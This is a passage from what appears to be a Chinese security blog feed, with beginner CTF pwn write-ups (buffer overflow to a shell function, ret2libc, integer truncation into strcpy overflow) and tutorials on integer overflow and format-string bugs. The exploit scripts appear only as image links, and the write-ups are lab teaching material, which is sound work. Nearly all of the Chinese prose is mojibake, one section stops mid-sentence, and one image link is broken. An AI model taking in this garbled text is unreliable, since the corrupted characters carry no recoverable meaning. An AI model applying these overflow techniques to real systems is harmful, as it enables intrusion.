<h3 id="å››ã€hello-pwn"><a href="#å››ã€hello-pwn" class="headerlink" title="å››ã€hello_pwn"></a>å››ã€hello_pwn</h3><p>æƒ¯ä¾‹çš„å…ˆè¿è¡Œä¸€ä¸‹é™„ä»¶ï¼Œè²Œä¼¼å•¥éƒ½æ²¡èƒ½å‘ç°ï¼Œç„¶åæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶æ˜¯32ä½è¿˜æ˜¯64ä½ï¼Œå†æ‹–å…¥ç›¸åº”çš„idaä¸­å¼€å§‹è¿›ä¸€æ­¥çš„åˆ†æ</p>
<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQå›¾ç‰‡20210316210858.png" style="zoom: 80%;">



<p>åœ¨idaä¸­F5åæ±‡ç¼–åï¼Œä»£ç ååˆ†ç®€å•<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQå›¾ç‰‡20210316211445.png" style="zoom: 67%;"></p>
<p>å¹¶æ²¡æœ‰ä»€ä¹ˆå†…å®¹ï¼Œåˆ°å¤„çœ‹çœ‹ï¼Œåœ¨ifæ¡ä»¶åçš„å‡½æ•°é‡Œé¢å‘ç°äº†<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210316214111.png"></p>
<p>æ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œæˆ‘ä»¬åªéœ€è¦è®©ç¨‹åºæ‰§è¡Œåˆ°è¿™ä¸ªå‡½æ•°å°±å¯ä»¥è·å–flagï¼Œè€Œè¦æ‰§è¡Œåˆ°è¿™é‡Œå°±è¦æ»¡è¶³ifé‡Œé¢çš„æ¡ä»¶ï¼Œè®©å˜é‡ç­‰äº</p>
<p>1853186401å³å¯ï¼Œæ­¤æ—¶æŸ¥çœ‹ä¸€ä¸‹å˜é‡å¤„äºçš„ä½ç½®ï¼Œä»¥åŠè®¡ç®—è·ç¦»readå¯è¾“å…¥åœ°å€çš„åå·®ï¼Œæœ€åå¾—å‡ºexpå¦‚ä¸‹</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210316211433.png"></p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210316214844.png"></p>
<p>æ³¨æ„expè¦printå‡ºæ¥ï¼Œå› ä¸ºè¿™æ ·æ‰èƒ½æŠŠæ¥æ”¶åˆ°flagæ‰“å°å‡ºæ¥ï¼Œæ˜¾ç¤ºåœ¨shellä¸­</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210316214934.png"></p>
<h3 id="äº”ã€level0"><a href="#äº”ã€level0" class="headerlink" title="äº”ã€level0"></a>äº”ã€level0</h3><p>checksecä¸€ä¸‹ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶çš„ä¿æŠ¤æªæ–½ä»¥åŠç¡®è®¤æ–‡ä»¶æ˜¯64ä½çš„ï¼Œæ‹–å…¥idaä¸­åˆ†æ</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210323220433.png"></p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210323220729.png"></p>
<p>å‘ç°readå†™å…¥å‡½æ•°å¯ä»¥å†™å…¥çš„å†…å®¹é•¿åº¦ååˆ†å¤§ï¼Œå®Œå…¨è¶³ä»¥è¦†ç›–è¿”å›åœ°å€ã€æ‰§è¡Œä»»æ„æŒ‡ä»¤äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å»å¯»æ‰¾ä¸€ä¸‹å¯ä»¥è¿›è¡Œè·å–shellæƒé™çš„å‡½æ•°ä¹‹ç±»çš„ä»£ç ï¼Œå¯ä»¥å‘ç°åœ¨ä¸€ä¸ªåä¸ºcallsystemçš„å‡½æ•°é‡Œé¢æœ‰ç€å¦‚å›¾çš„ç¨‹åº<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210323221023.png"></p>
<p>çœ‹åˆ°è¿™ä¸ªï¼Œä¹Ÿä»£è¡¨ç€æƒé™å‡½æ•°ä¹Ÿæ‰¾åˆ°äº†ï¼Œä¹‹ååªéœ€è¦è¿›è¡Œç®€å•çš„è®¡ç®—åç§»åœ°å€è¿›è¡Œè¦†ç›–è¿”å›åœ°å€ï¼Œä»è€Œè·³è½¬åˆ°è¿™ä¸ªå‡½æ•°æ‰§è¡Œå³å¯è·å–flagï¼Œexpå¦‚ä¸‹ï¼š</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210323221229.png"></p>
<p>é¡ºä¾¿æä¸€ä¸‹ï¼Œcallsystemå‡½æ•°çš„åœ°å€å¯ä»¥åœ¨å·¦è¾¹å‡½æ•°åˆ—è¡¨æ‹–å‘å³è¾¹çœ‹åˆ°ï¼Œæˆ–è€…åœ¨å³ä¸‹è§’ä¹Ÿæœ‰</p>
<h3 id="å…­ã€level2"><a href="#å…­ã€level2" class="headerlink" title="å…­ã€level2"></a>å…­ã€level2</h3><p>checksecä¸€ä¸‹ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶çš„ä¿æŠ¤æªæ–½ä»¥åŠç¡®è®¤æ–‡ä»¶æ˜¯32ä½çš„ï¼Œå†å»idaä¸­è¿›è¡Œé™æ€åˆ†æï¼Œ</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326201427.png"></p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326202416.png"></p>
<p>è®¡ç®—åå·®ä¹‹åï¼Œå¯ä»¥å‘ç°å­˜åœ¨æº¢å‡ºï¼Œä¹‹åå°±æ˜¯å¯»æ‰¾ç³»ç»Ÿå‡½æ•°ï¼Œè·³è½¬æ‹¿åˆ°shellæƒé™</p>
<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQå›¾ç‰‡20210326202641.png" style="zoom:50%;">

<p>å‘ç°å­˜åœ¨ç€/bin/shå’Œsystemå‡½æ•°ï¼Œè¶³ä»¥æ„é€ payloadäº†ï¼Œexpå¦‚ä¸‹ï¼š</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326203123.png"></p>
<h3 id="ä¸ƒã€level3"><a href="#ä¸ƒã€level3" class="headerlink" title="ä¸ƒã€level3"></a>ä¸ƒã€level3</h3><p>checksecä¸€ä¸‹ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶çš„ä¿æŠ¤æªæ–½ä»¥åŠç¡®è®¤æ–‡ä»¶æ˜¯32ä½çš„</p>
<p>![](2021-03-16-æ”»é˜²ä¸–ç•Œpwnæ–°æ‰‹é¢˜wp.assets/QQå›¾ç‰‡20210326203123-1616762538191.png</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326204057.png"></p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326204257.png"></p>
<p>è·Ÿlevel2ä¸€æ ·çš„æº¢å‡ºç‚¹ï¼Œä½†æ˜¯æŸ¥æ‰¾å‡½æ•°å’Œå­—ç¬¦ä¸²åˆ—è¡¨æ‰¾ä¸åˆ°systemå’Œbinshå­—ç¬¦ä¸²äº†ï¼Œé‚£æ­¤æ—¶å°±éœ€è¦ä½¿ç”¨åˆ°libcè¿™ä¸ªå…±äº«åº“äº†ï¼Œæ–‡ä»¶é‡Œé¢å·²ç»åŒ…å«äº†è¿™ä¸ªå…±äº«åº“ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œé€šè¿‡libcä»è€Œè·å¾—systemå’Œbinshå­—ç¬¦ä¸²çš„ç»å¯¹åœ°å€ï¼Œè€Œä¸ºäº†è·å–è¿™ä¸¤ä¸ªï¼Œå°±è¦ä½¿ç”¨é™„ä»¶é‡Œé¢å·²ç»è¢«è°ƒç”¨çš„å‡½æ•°å–è®¡ç®—è¯¥å‡½æ•°çš„ç»å¯¹åœ°å€å’Œlibcåº“åœ°å€çš„åå·®ï¼Œå› ä¸ºåœ¨åå·®æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥å¯ä»¥å€Ÿæ­¤è·å¾—systemå’Œbinshå­—ç¬¦ä¸²çš„ç»å¯¹åœ°å€ï¼Œexpå¦‚ä¸‹ï¼š<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326205423.png"></p>
<h3 id="å…«ã€string"><a href="#å…«ã€string" class="headerlink" title="å…«ã€string"></a>å…«ã€string</h3><p>checksecä¸€ä¸‹ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶çš„ä¿æŠ¤æªæ–½ä»¥åŠç¡®è®¤æ–‡ä»¶æ˜¯</p>
<h3 id="ä¹ã€int-overflow"><a href="#ä¹ã€int-overflow" class="headerlink" title="ä¹ã€int_overflow"></a>ä¹ã€int_overflow</h3><p>checksecä¸€ä¸‹ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶çš„ä¿æŠ¤æªæ–½ä»¥åŠç¡®è®¤æ–‡ä»¶æ˜¯32ä½çš„<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326211227.png"></p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326211618-1616764664538.png"></p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326211724.png"></p>
<p>é¦–å…ˆv4åªèƒ½ç­‰äº1è¿›å…¥loginï¼Œåé¢çš„å‡½æ•°ä¹Ÿèƒ½å‘ç°ï¼Œå…¨éƒ½å¤Ÿä¸åˆ°è¿”å›åœ°å€ï¼Œæ‰€ä»¥æ— æ³•è¿›è¡Œæº¢å‡ºï¼Œç»§ç»­å¾€åé¢çœ‹ï¼Œ</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326212348.png"></p>
<p>è®¤çœŸå®¡è®¡è¿™é¡µä»£ç ï¼Œå‘ç°v3å¿…é¡»è¦åœ¨4-7ä¹‹é—´ï¼Œç„¶åæ‰èƒ½åˆ°strcpyå‡½æ•°é‚£é‡Œï¼Œè€Œé‚£é‡Œdestçš„åœ°å€è·ç¦»è¿”å›åœ°å€å¯æ˜¯ååˆ†è¿‘çš„ï¼Œé‚£ä¹ˆåˆ©ç”¨ç‚¹æ˜¯å¦å¯èƒ½åœ¨sä¸Šé¢ï¼Ÿæ¥ç€çœ‹v3ç«Ÿç„¶æ˜¯æ— ç¬¦å·çš„8ä½æ•´å‹æ•°ï¼Œ ä¼¼ä¹å¯ä»¥åˆ©ç”¨æ•´æ•°æº¢å‡ºï¼Œè€Œè®©v3æˆªæ–­åœ¨4-7ä¹‹é—´ï¼Œå®é™…sé‡Œé¢çš„å­—ç¬¦å´è¿œè¿œä¸æ­¢è¿™ä¹ˆä¸€ç‚¹ï¼Œè€Œså°±æ˜¯ä¸Šä¸€é¡µçš„charï¼Œæ˜¯å¯ä»¥éšæ„è¾“å…¥çš„ã€‚expå¦‚ä¸‹ï¼š</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326212348-1616765685730.png"></p>
]]></content>
  </entry>
  <entry>
    <title>æ•´æ•°æº¢å‡º</title>
    <url>/2020/12/10/2020-12-10-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<p>æ•°æ®ç±»å‹ä»¥åŠæ‰€å–çš„èŒƒå›´ï¼ˆæ¥è‡ªctf-wikiï¼Œä¹‹åçš„å†…å®¹ä¹Ÿæ˜¯å‚ç…§äº†è®¸å¤šçš„wikiï¼Œä»¥åŠä¸€äº›æ¥è‡ªåˆ«å¤„çš„é›¶ç¢,ç¯å¢ƒä¸º64ä½ä¸‹ä½¿ç”¨gcc-5.4ï¼‰</p>
<table>
<thead>
<tr>
<th align="center">ç±»å‹</th>
<th align="center">å­—èŠ‚</th>
<th align="center">èŒƒå›´</th>
</tr>
</thead>
<tbody><tr>
<td align="center">short int</td>
<td align="center">2byte(word)</td>
<td align="center">0~32767(0~0x7fff) <br> -32768~-1(0x8000~0xffff)</td>
</tr>
<tr>
<td align="center">unsigned short int</td>
<td align="center">2byte(word)</td>
<td align="center">0~65535(0~0xffff)</td>
</tr>
<tr>
<td align="center">int</td>
<td align="center">4byte(dword)</td>
<td align="center">0~2147483647(0~0x7fffffff) <br> -2147483648~-1(0x80000000~0xffffffff)</td>
</tr>
<tr>
<td align="center">unsigned int</td>
<td align="center">4byte(dword)</td>
<td align="center">0~4294967295(0~0xffffffff)</td>
</tr>
<tr>
<td align="center">long int</td>
<td align="center">8byte(qword)</td>
<td align="center">æ­£: 0~0x7fffffffffffffff<br>è´Ÿ:0x8000000000000000~0xffffffffffffffff</td>
</tr>
<tr>
<td align="center">unsigned long int</td>
<td align="center">8byte(qword)</td>
<td align="center">0~0xffffffffffffffff</td>
</tr>
</tbody></table>
<p>é‚£ä¹ˆï¼Œæ‰€è°“çš„æ•´æ•°æº¢å‡ºï¼Œå°±æ˜¯æŒ‡ç¨‹åºä¸­å˜é‡æ‰€å–æ•°æ®è¶…è¿‡äº†å…¶æ•°æ®ç±»å‹çš„èŒƒå›´è€Œé€ æˆçš„æº¢å‡ºç°è±¡ã€‚</p>
<p>æ•´æ•°æº¢å‡ºä¸€å…±åˆ†ä¸ºä¸‰ç§ç±»å‹ï¼š</p>
<ul>
<li>æœ‰ç¬¦å·æ•°æº¢å‡º</li>
<li>æ— ç¬¦å·æ•°æº¢å‡º</li>
<li>é«˜ä½æ•°ä¼ ä½ä½æ•°çš„æˆªæ–­</li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><code class="hljs x86asm"># ä¼ªä»£ç <br>short <span class="hljs-keyword">int</span> a<span class="hljs-comment">;</span><br><br>a = a + <span class="hljs-number">1</span><span class="hljs-comment">;</span><br># å¯¹åº”çš„æ±‡ç¼–<br><span class="hljs-keyword">movzx</span>  <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> - <span class="hljs-number">0x1c</span>]<br><span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> - <span class="hljs-number">0x1c</span>], <span class="hljs-built_in">ax</span><br><br>unsigned short <span class="hljs-keyword">int</span> b<span class="hljs-comment">;</span><br><br>b = b + <span class="hljs-number">1</span><span class="hljs-comment">;</span><br># assembly code<br><span class="hljs-keyword">add</span>    <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> - <span class="hljs-number">0x1a</span>], <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>ä»¥ä¸Šä¸ºæ— ç¬¦å·æ•°å’Œæœ‰ç¬¦å·æ•°è¿›è¡Œ+1æ“ä½œçš„æ±‡ç¼–æŒ‡ä»¤ï¼Œå¯ä»¥çœ‹å‡ºï¼Œæœ‰ç¬¦å·æ•°çš„è¿ç®—æ˜¯åœ¨å¯„å­˜å™¨ä¸­è¿›è¡Œè¿ç®—çš„ï¼Œè€Œæ— ç¬¦å·æ•°æ˜¯ç›´æ¥åœ¨å†…å­˜ä¸­è¿›è¡Œè¿ç®—çš„</p>
<h1 id="æœ‰ç¬¦å·æ•°æº¢å‡º"><a href="#æœ‰ç¬¦å·æ•°æº¢å‡º" class="headerlink" title="æœ‰ç¬¦å·æ•°æº¢å‡º"></a>æœ‰ç¬¦å·æ•°æº¢å‡º</h1><p>ä»¥ä¸‹å‡å‡è®¾ short int a;</p>
<h3 id="ä¸Šç•Œæº¢å‡º"><a href="#ä¸Šç•Œæº¢å‡º" class="headerlink" title="ä¸Šç•Œæº¢å‡º"></a>ä¸Šç•Œæº¢å‡º</h3><p>shortçš„èŒƒå›´åœ¨0~0x7fffå’Œè´Ÿæ•°0x8000~0xffff</p>
<p>å‡è®¾å–æœ€å¤§å€¼0x7fff(32767)æŠŠå®ƒè¿›è¡ŒåŠ 1çš„è¿ç®—ï¼Œå˜ä¸º0x8000ï¼Œå°±ä¼šå‘ç°ï¼š0x8000åœ¨æœ‰ç¬¦å·æ•°ä¸­æ˜¯-32768ï¼Œå®ç°äº†ä»ä¸€ä¸ªæ­£æ•°å˜ä¸ºäº†è´Ÿæ•°ï¼Œç”¨åè¿›åˆ¶æ¥è¡¨ç¤ºå°±æ˜¯<strong>32767+1==-32768</strong> </p>
<h3 id="ä¸‹ç•Œæº¢å‡º"><a href="#ä¸‹ç•Œæº¢å‡º" class="headerlink" title="ä¸‹ç•Œæº¢å‡º"></a>ä¸‹ç•Œæº¢å‡º</h3><p>å‡è®¾å–æœ€å°å€¼0x8000è¿›è¡Œå‡1è¿ç®—ï¼Œå¾—åˆ°ç»“æœä¸º0x7fffï¼Œè¿™åœ¨æœ‰ç¬¦å·æ•°ä¸­æ˜¯æ­£æ•°32767ã€‚</p>
<p>å³ï¼š**-32768-1==32767**</p>
<h2 id="æ— ç¬¦å·æ•°æº¢å‡º"><a href="#æ— ç¬¦å·æ•°æº¢å‡º" class="headerlink" title="æ— ç¬¦å·æ•°æº¢å‡º"></a>æ— ç¬¦å·æ•°æº¢å‡º</h2><p>ä»¥ä¸‹å‡å‡è®¾ unsigned short int </p>
<h3 id="ä¸Šç•Œæº¢å‡º-1"><a href="#ä¸Šç•Œæº¢å‡º-1" class="headerlink" title="ä¸Šç•Œæº¢å‡º"></a>ä¸Šç•Œæº¢å‡º</h3><p>unsigned shortçš„èŒƒå›´æ˜¯åœ¨0~0xffff</p>
<p>å‡è®¾å–æœ€å¤§å€¼0xffffè¿›è¡ŒåŠ 1è¿ç®—ï¼Œè™½ç„¶ç»“æœæœ¬åº”è¯¥æ˜¯0x10000ï¼Œä½†æ˜¯ç”±äºåªèƒ½å­˜å‚¨ä¸¤ä¸ªå­—èŠ‚çš„åŸå› ï¼Œä¼šè¿›è¡Œæˆªæ–­ï¼Œåªèƒ½å–åˆ°0x0000ã€‚è¿™ä¸ªè¿‡ç¨‹ç”¨åè¿›åˆ¶æ¥è¡¨ç¤ºå°±æ˜¯<strong>65535+1==0</strong></p>
<h3 id="ä¸‹ç•Œæº¢å‡º-1"><a href="#ä¸‹ç•Œæº¢å‡º-1" class="headerlink" title="ä¸‹ç•Œæº¢å‡º"></a>ä¸‹ç•Œæº¢å‡º</h3><p>å‡è®¾å–æœ€å°å€¼0x0000è¿›è¡Œå‡1è¿ç®—ï¼Œå› ä¸ºæ— ç¬¦å·æ•°ä¸å­˜åœ¨è´Ÿæ•°ï¼Œé‚£ä¹ˆå¾—åˆ°çš„ç»“æœ0xffffä¸ä¼šè¿›è¡Œè´Ÿæ•°çš„è¡¥ç è¿˜åŸå¾—åˆ°-1ï¼Œè€Œæ˜¯æŒ‰ç…§æ•´æ•°å¾—åˆ°65535ï¼Œå³<strong>0-1==65535</strong></p>
<p>ä»¥ä¸Šï¼Œä¸¤ç§çš„ä¸Šä¸‹ç•Œæº¢å‡ºçš„é“ç†æ˜¯ä¸€è‡´çš„ï¼Œéƒ½æ˜¯å› ä¸ºè®¡ç®—æœºåº•å±‚æŒ‡ä»¤æ˜¯ä¸åŒºåˆ†æœ‰ç¬¦å·å’Œæ— ç¬¦å·çš„ï¼Œæ•°æ®éƒ½æ˜¯ä»¥äºŒè¿›åˆ¶å½¢å¼å­˜åœ¨è€Œåœ¨ç¼–è¯‘å™¨çš„å±‚é¢æ‰å¯¹æœ‰ç¬¦å·å’Œæ— ç¬¦å·è¿›è¡ŒåŒºåˆ†ï¼Œäº§ç”Ÿä¸åŒçš„æ±‡ç¼–æŒ‡ä»¤ã€‚æ­£å‰åçš„ä¸ä¸€è‡´ï¼Œé€ æˆäº†æ¼æ´çš„å‡ºç°</p>
<h2 id="é«˜ä½æ•°ä¼ ä½ä½æ•°çš„æˆªæ–­"><a href="#é«˜ä½æ•°ä¼ ä½ä½æ•°çš„æˆªæ–­" class="headerlink" title="é«˜ä½æ•°ä¼ ä½ä½æ•°çš„æˆªæ–­"></a>é«˜ä½æ•°ä¼ ä½ä½æ•°çš„æˆªæ–­</h2><p>è¿™ç§å…¶å®æœ€å¥½ç†è§£ï¼Œå°±æ˜¯å› ä¸ºæ•°æ®ç±»å‹çš„ä½æ•°ä¸å¤Ÿï¼Œè€Œä¸èƒ½å–å¾—å®Œå…¨å€¼ï¼Œåªèƒ½å–åˆ°ä¸è‡ªèº«ä½æ•°ç›¸ç­‰çš„æ•°å€¼ï¼Œè€Œé€ æˆæ•°æ®çš„æˆªæ–­</p>
<ul>
<li>åŠ æ³•æˆªæ–­ï¼š </li>
</ul>
<figure class="highlight excel"><table><tr><td class="code"><pre><code class="hljs excel"><span class="hljs-number">0</span>xffffffff + <span class="hljs-number">0</span>x00000001 <br><br>= <span class="hljs-number">0</span>x0000000100000000 (long <span class="hljs-built_in">int</span>) <br><br>= <span class="hljs-number">0</span>x00000000 (<span class="hljs-built_in">int</span>) <br></code></pre></td></tr></table></figure>

<ul>
<li>ä¹˜æ³•æˆªæ–­</li>
</ul>
<figure class="highlight excel"><table><tr><td class="code"><pre><code class="hljs excel"><span class="hljs-number">0</span>x00123456 * <span class="hljs-number">0</span>x00654321 <br>= <span class="hljs-number">0</span>x000007336BF94116 (long <span class="hljs-built_in">int</span>) <br>= <span class="hljs-number">0</span>x6BF94116 (<span class="hljs-built_in">int</span>)<br></code></pre></td></tr></table></figure>

<p>æ•´æ•°æº¢å‡ºå°±å¤§è‡´åˆ°æ­¤äº†ï¼Œä½†æ˜¯å¦‚ä½•åˆ©ç”¨å®ƒé€ æˆå±å®³å‘¢ï¼Ÿä¸€èˆ¬éƒ½æ˜¯åˆ©ç”¨æ•´æ•°æº¢å‡ºå’Œå…¶ä»–çš„æ¼æ´è¿›è¡Œæ­é…è€Œé€ æˆå±å®³ã€‚</p>
<p>ä»¥ä¸‹æœ‰ä¸¤ä¸ªå‡½æ•°ï¼Œå¸¸è¢«è¯¯ç”¨è€Œäº§ç”Ÿæ•´æ•°æº¢å‡ºï¼Œæ¥ç€å°±å¯èƒ½å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚</p>
<ul>
<li>memcpy()å‡½æ•°åŸå‹ä¸ºvoid *memcpy(void *dest, const void *src, size_t n); åŠŸèƒ½æ˜¯å°† src æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²çš„å‰ n ä¸ªå­—ç¬¦å¤åˆ¶åˆ° dest æ‰€æŒ‡çš„æ•°ç»„ä¸­ï¼Œå¹¶è¿”å› destã€‚</li>
<li>strncpy()å‡½æ•°åŸå‹ä¸ºchar *strncpy(char *dest, const char *src, size_t n)ï¼›åŠŸèƒ½æ˜¯ä»æº src æ‰€æŒ‡çš„å†…å­˜åœ°å€çš„èµ·å§‹ä½ç½®å¼€å§‹å¤åˆ¶ n ä¸ªå­—èŠ‚åˆ°ç›®æ ‡ dest æ‰€æŒ‡çš„å†…å­˜åœ°å€çš„èµ·å§‹ä½ç½®ä¸­ã€‚å¹¶ä¸ä¼šè‡ªåŠ¨æ·»åŠ â€™\0â€™å­—ç¬¦ã€‚ </li>
</ul>
<p>è¿™ä¸¤ä¸ªå‡½æ•°çš„néƒ½æ˜¯æ— ç¬¦å·æ•°ï¼Œå¦‚æœç”¨ä¸€ä¸ªè´Ÿæ•°å»å¡«å……ï¼Œå°±å¯èƒ½å˜æˆä¸€ä¸ªå¾ˆå¤§çš„æ•°ã€‚ä»è€Œå¤åˆ¶å¤§é‡å†…å®¹åˆ°ç¼“å†²åŒºä¸­ï¼Œé€ æˆæº¢å‡º</p>
<p>å…¶ä»–çš„å°±é åšé¢˜ä¸å®æˆ˜å»æå‡å·©å›ºäº†</p>
]]></content>
  </entry>
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</title>
    <url>/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="å‰æçŸ¥è¯†å‚¨å¤‡ï¼š"><a href="#å‰æçŸ¥è¯†å‚¨å¤‡ï¼š" class="headerlink" title="å‰æçŸ¥è¯†å‚¨å¤‡ï¼š"></a>å‰æçŸ¥è¯†å‚¨å¤‡ï¼š</h2><h3 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å¯ä»¥æ¥å—<strong>å¯å˜æ•°é‡</strong>çš„å‚æ•°ï¼Œå¹¶å°†<strong>ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å…¶æ¥è§£æä¹‹åçš„å‚æ•°</strong>ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨åˆ©ç”¨çš„æ—¶å€™ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†</p>
<ul>
<li>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°</li>
<li>æ ¼å¼åŒ–å­—ç¬¦ä¸²</li>
<li>åç»­å‚æ•°ï¼Œå°±æ˜¯ä¸‹å›¾ä¸­é€—å·åçš„å˜é‡ï¼ˆå¯ä»¥ä¸è¦ï¼‰</li>
</ul>
<p>ä¸Šè¿°å¯è½¬ä¸ºè¯¥å›¾ï¼š</p>
<p><img src="/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/printf.png"></p>
<p>å°†ç›¸å…³æ­£å¼æ¦‚å¿µä»£å…¥å›¾ç‰‡æ›´å¥½ç†è§£</p>
<h3 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h3><p>è¾“å…¥ï¼š</p>
<ul>
<li>scanf</li>
</ul>
<p>è¾“å‡ºå‡½æ•°</p>
<table>
<thead>
<tr>
<th align="center">å‡½æ•°</th>
<th align="center">åŸºæœ¬ä»‹ç»</th>
</tr>
</thead>
<tbody><tr>
<td align="center">printf</td>
<td align="center">è¾“å‡ºåˆ°stdout</td>
</tr>
<tr>
<td align="center">fprintf</td>
<td align="center">è¾“å‡ºåˆ°æŒ‡å®šFILEæµ</td>
</tr>
<tr>
<td align="center">vprintf</td>
<td align="center">æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºåˆ° stdout</td>
</tr>
<tr>
<td align="center">vfprintf</td>
